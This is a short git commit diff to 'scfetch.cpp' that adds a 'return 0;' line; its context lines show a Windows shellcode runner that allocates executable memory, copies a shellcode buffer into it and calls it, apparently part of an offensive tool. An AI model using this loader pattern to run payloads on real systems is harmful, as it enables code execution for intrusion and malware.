69922ed49b819ed73cd19a3aac7d0ca40c22d6a4
s1egesystems <51238001+s1egesystems@users.noreply.github.com>
2020-01-11 14:32:19 +0000

    Update scfetch.cpp

--- scfetch.cpp
+++ scfetch.cpp
@@ -67,5 +67,6 @@ int main()
 	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, shellcode, sizeof shellcode);
 	((void(*)())exec)();
-
+	
+	return 0;
 }
